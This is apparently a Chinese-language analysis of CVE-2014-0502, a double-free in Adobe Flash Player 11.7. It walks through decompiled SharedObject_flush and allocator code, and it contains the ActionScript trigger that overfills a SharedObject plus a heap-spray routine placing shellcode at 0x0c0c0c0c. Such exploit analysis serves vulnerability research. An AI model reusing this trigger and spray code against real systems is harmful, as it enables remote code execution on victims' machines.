{"title": "CVE-2014-0502\u5206\u6790", "tags": "Exploit DoubleFree", "content": "## 0x00.\u73af\u5883\r\n\u7cfb\u7edf:\uff1aWINXP SP3\r\n\r\n\u5f71\u54cd\u8f6f\u4ef6\uff1aAdobe Flash Player 11.7.700.261\r\n\r\n## 0x01.\u6210\u56e0\r\n\u5f53\u5b58\u50a8\u672c\u5730\u4fe1\u606f\u6587\u4ef6\u8d85\u8fc7\u6700\u5927\u5927\u5c0f\u540e\uff0c\u5bfc\u81f4pending\u6807\u5fd7\u4f4d\u4e00\u76f4\u7f6e\u4f4d\uff0c\u4ece\u800c\u9020\u6210DoubleFree\r\n\r\n## 0x02.\u8981\u70b9\r\n \r\n##### 0x00.\u4e3a\u4f55\u6b64\u5904\u503c\u662f100K?\r\n```javascript\r\n\t\tpublic function triggerexp():void\r\n\t\t{\r\n\t\t\tvar exp:String=\"AAAA\";\r\n\t\t\t//\t\t\twhile(exp.length<1024*100)\r\n\t\t\t//\t\t\t\texp=exp+exp;\r\n\t\t\t\r\n\t\t\twhile(exp.length<1024*100)\r\n\t\t\t{\r\n\t\t\t\texp=exp+((Math.random()<<16)+(Math.random()>>16)).toString();\r\n\t\t\t}\r\n\t\t\tvar sobj:SharedObject=SharedObject.getLocal(\"record\");\r\n\t\t\tsobj.data.logs=exp;\r\n\t\t}\r\n```\r\n\u56e0\u4e3a\u8d85\u8fc7\u8fd9\u91cc\u7684\u8bbe\u7f6e\u624d\u4f1a\u89e6\u53d1\u6f0f\u6d1e\r\n![img](data\\cve-2014-0502\\flash-stroage.png)\r\n\r\n\u4f9d\u636e\u662f\u5728\u8fdb\u5165ROP\u524d\uff0c\u6839\u636e\u6808\u4fe1\u606f\u8fdb\u884c\u56de\u6eaf\uff0c\u5bf9\u7b2c\u4e00\u4e2a\u8c03\u7528\u51fd\u6570\u5206\u6790\r\n```\r\nint __thiscall SharedObject_flush(int this, char a2, double a3, char a4)\r\n{\r\n  int v6; // edx@4\r\n  int v7; // ecx@4\r\n  signed int v8; // ebx@4\r\n  void *v9; // eax@7\r\n  int v10; // eax@12\r\n  int v11; // eax@12\r\n  void *v12; // eax@16\r\n  void *v13; // ecx@16\r\n  int v14; // edi@16\r\n  void *v15; // eax@17\r\n  int v16; // eax@19\r\n  bool v17; // zf@19\r\n  bool v18; // sf@19\r\n  unsigned __int8 v19; // of@19\r\n  char *v20; // eax@19\r\n  int file_size; // eax@21\r\n  int v22; // ecx@25\r\n  int v23; // eax@25\r\n  char v24; // al@27\r\n  int v25; // ecx@30\r\n  int v26; // [sp-Ch] [bp-28h]@12\r\n  int v27; // [sp-8h] [bp-24h]@12\r\n  int v28; // [sp-4h] [bp-20h]@12\r\n  int v29; // [sp+Ch] [bp-10h]@12\r\n  int v30; // [sp+14h] [bp-8h]@18\r\n  int max_size; // [sp+18h] [bp-4h]@7\r\n\r\n  if ( !(*(this + 190) & 1) )\r\n    return 0;\r\n  sub_100F0B44(this);\r\n  v8 = 0;\r\n  if ( !*(this + 193) && 0.0 == a3 ) //\u5982\u679cpending\u6807\u5fd7\u4f4d\u662f0\u5219\u76f4\u63a5\u8fd4\u56de\uff0c\u4e5f\u5c31\u65e0\u6cd5\u8c03\u7528ROP\r\n    return 1;\r\n  v9 = *(*(this + 184) + 44);\r\n  max_size = -2;\r\n  if ( !a4 )\r\n    max_size = sub_100A8EAD(*(*(this + 8) + 1512), v6, v9);\r\n  if ( !*(this + 193) && (max_size > a3 || max_size == -2) )\r\n    return 1;\r\n  v10 = *this;\r\n  v28 = 0;\r\n  v27 = *(this + 8);\r\n  a4 = 1;\r\n  v26 = v7;\r\n  v11 = (*(v10 + 8))(this);                     // rop\r\n  sub_10271423(&v29, v11, v27, 0);\r\n  sub_100ED935(this, v29, &a4);\r\n  if ( *(this + 76) )\r\n  {\r\n    if ( max_size == -1 )\r\n    {\r\n      max_size = 0;\r\n      a2 = 0;\r\n    }\r\n    if ( max_size != -2 )\r\n    {\r\n      v12 = *(this + 84);\r\n      v13 = *(this + 108);\r\n      v28 = 0;\r\n      v14 = sub_100F12FD(v13, v12, 1, *(this + 8), 0);\r\n      if ( *(this + 124) > 0 )\r\n      {\r\n        v15 = *(this + 120);\r\n        v28 = 0;\r\n        v14 += sub_100F12FD(v15, 0, 1, *(this + 8), 0);\r\n      }\r\n      v30 = max_size - v14;\r\n      if ( a3 <= 0.0 )\r\n      {\r\n        file_size = *(v29 + 12);\r\n      }\r\n      else\r\n      {\r\n        HIDWORD(a3) = a3;\r\n        v16 = *(v29 + 12);\r\n        v19 = __OFSUB__(v16, HIDWORD(a3));\r\n        v17 = v16 == HIDWORD(a3);\r\n        v18 = v16 - HIDWORD(a3) < 0;\r\n        max_size = *(v29 + 12);\r\n        v20 = &max_size;\r\n        if ( (v18 ^ v19) | v17 )\r\n          v20 = &a3 + 4;\r\n        file_size = *v20;\r\n      }\r\n      if ( file_size > v30 ) //   \u5982\u679c\u8d85\u8fc7100KB\u5219\u8df3\u8fc7\u5904\u7406\u76f4\u63a5\u8fd4\u56de\r\n      {\r\n        if ( a2 )\r\n        {\r\n          v28 = *(this + 176);\r\n          v22 = *(*(this + 184) + 44);\r\n          v27 = v14 + file_size;\r\n          v23 = *(this + 8);\r\n          v26 = v22;\r\n          sub_100A9005(*(v23 + 1512), v22, v27, v28);\r\n          v8 = -1;\r\n        }\r\n        goto LABEL_26;\r\n      }\r\n    }\r\n    v24 = sub_100E4945(*(*(this + 184) + 44));\r\n    if ( *(*(this + 8) + 1126) && !v24 )\r\n    {\r\n      v28 = a4;\r\n      sub_100F0904(*(v29 + 8), *(v29 + 12), a4);\r\nLABEL_31:\r\n      *(this + 193) = 0;                        // pending\u6807\u5fd7\u6e05\u96f6!!!!!!\r\n      v8 = 1;\r\n      goto LABEL_26;\r\n    }\r\n    v25 = *(v29 + 12);\r\n    v28 = a4;\r\n    if ( write_to_file(this, *(v29 + 8), v25, a4) )// \u5199\u5165\u5230\u6587\u4ef6\r\n      goto LABEL_31;\r\n  }\r\nLABEL_26:\r\n  sub_102700FA(&v29);\r\n  return v8;\r\n}\r\n```\r\n\r\n##### 0x01.\u5982\u4f55\u5b8c\u6210\u7684\u5806\u55b7\uff1f\r\n\u6211\u4e5f\u4e0d\u592a\u7406\u89e3EXP\u91cc\u4e3a\u4ec0\u4e48\u8981-0x24\uff0c\u6211\u6539\u6210\u4e0b\u9762\u8fd9\u6837\u4f9d\u7136\u6b63\u5e38\r\n```\r\n            i = 0;\r\n            while(i < 0xc0c)\r\n            {\r\n               val.writeByte(144 + i);\r\n               i++;\r\n            }\r\n            val.writeBytes(shellbytes);\r\n            i = val.length;\r\n            while(i < 0x10000)\r\n            {\r\n               val.writeByte(i);\r\n               i++;\r\n            }\r\n            block = new ByteArray();\r\n            block.writeBytes(val);\r\n            while(block.length < 0x100000)\r\n            {\r\n               block.writeBytes(val);\r\n            }\r\n            \u0200 = [];\r\n            i = 0;\r\n            while(i < 224)\r\n            {\r\n               block1 = new ByteArray();\r\n               block1.writeBytes(block,0,0x100000);\r\n               \u0200.push(block1);\r\n               i++;\r\n            }\r\n```\r\n\u8fd9\u6837\u5c31\u53ef\u4ee5\u7a33\u5b9a\u5c06shellcode\u653e\u7f6e\u5728c0c0c0c\r\n\r\n### 0x02.\u5982\u4f55\u5b9e\u73b0\u5229\u7528\uff1f\r\n\u9996\u5148\u53c2\u8003\u8fd9\u4e2aPPT[\u300aFlash \u865a\u62df\u673a\u5185\u5b58\u7ba1\u7406\u53ca\u6f0f\u6d1e\u5229\u7528\u300b](https://wenku.baidu.com/view/a63080886bd97f192279e9c8.html)\r\n\r\n\u6839\u636eROP\u4e0b\u65ad,\u5bf9KV\u8fdb\u884c\u56de\u6eaf\u5206\u6790\uff08\u6211\u662f\u4e00\u6b65\u6b65F11\u624d\u627e\u5230\u7684\u3002\u3002\u3002\uff09\uff0c\u627e\u5230\u5206\u914d\u5185\u5b58\u51fd\u6570\r\n```\r\nsub_105A96C0(dword_10EDFEA0, v5, a3);\r\n\r\nchar *__fastcall sub_105A96C0(int a1, unsigned int size, unsigned int a3)\r\n{\r\n  int v3; // eax@3\r\n  int v4; // eax@5\r\n  int v5; // esi@5\r\n  struct_v6 *v6; // edi@5\r\n  volatile LONG *v7; // ebp@5\r\n  struct_v8 *v8; // esi@8\r\n  char *result; // eax@12\r\n  char *v10; // eax@13\r\n  unsigned __int16 v11; // cx@13\r\n  struct_v8 *Buf; // ebx@14\r\n  struct_v8 *buf; // eax@19\r\n  struct_v8 *v14; // eax@21\r\n  struct_v8 *v15; // edi@24\r\n  volatile LONG *Destination; // [sp+0h] [bp-4h]@5\r\n\r\n  if ( size > 0x7F0 )\r\n  {\r\n    result = alloc_big_block(a1, size, a3);\r\n  }\r\n  else\r\n  {\r\n    if ( size > 4 )\r\n      v3 = byte_10C7EAC8[(size + 7) >> 3];\r\n    else\r\n      v3 = 0;\r\n    v4 = 9 * v3;\r\n    LOBYTE(v5) = 0;\r\n    v6 = (a1 + 4 * v4 + 4);\r\n    v7 = (a1 + 4 * v4 + 36);\r\n    Destination = (a1 + 4 * v4 + 36);\r\n    if ( InterlockedCompareExchange(v7, 1, 0) )\r\n    {\r\n      do\r\n      {\r\n        v5 = (v5 + 1) & 0x3F;\r\n        Sleep(v5 == 0);\r\n      }\r\n      while ( InterlockedCompareExchange(Destination, 1, 0) );\r\n      v7 = Destination;\r\n    }\r\n    v8 = v6->firstFree;\r\n    if ( v8 || (sub_105AD290(v6, (a3 >> 1) & 1), (v8 = v6->firstFree) != 0) )\r\n    {\r\n      ++v8->numAlloc;\r\n      v10 = v8->firstItem;\r\n      v11 = v8->numAlloc;\r\n      if ( v8->firstItem )\r\n      {\r\n        v8->firstItem = *v10;\r\n        Buf = v10;\r\n      }\r\n      else\r\n      {\r\n        Buf = v8->nextItem;\r\n        if ( v11 == v6->maxNumAlloc )\r\n          v8->nextItem = 0;\r\n        else\r\n          v8->nextItem = &Buf->firstItem + v6->allocSize;\r\n      }\r\n      if ( v11 == v6->maxNumAlloc )\r\n      {\r\n        buf = v8->prevFree;\r\n        if ( buf && buf->nextFree != v8 || (v14 = v8->nextFree) != 0 && v14->prevFree != v8 )\r\n          abort();\r\n        v6->firstFree = v8->nextFree;\r\n        v8->nextFree = 0;\r\n        v15 = v6->firstFree;\r\n        if ( v15 )\r\n          v15->prevFree = 0;\r\n      }\r\n      if ( a3 & 1 )\r\n        memset(Buf, 0, v8->size);\r\n      InterlockedExchange(v7, 0);\r\n      result = Buf;\r\n    }\r\n    else\r\n    {\r\n      if ( !((a3 >> 1) & 1) )\r\n        sub_105ABA90(\"Failed to abort\");\r\n      InterlockedExchange(v7, 0);\r\n      result = 0;\r\n    }\r\n  }\r\n  return result;\r\n}\r\n```\r\n\u6839\u636e\u4e0a\u9762\u7684\u7ebf\u7d22\uff0c\u5728\u8c03\u7528ROP\u5904\u65ad\u4e0b\uff0c\u6839\u636e\u4fe1\u606f\u7b97\u51faROP\u5e94\u8be5\u7684\u5927\u5c0f\uff0c\u5982\u56fe\r\n![debug](data\\cve-2014-0502\\debug.png)"}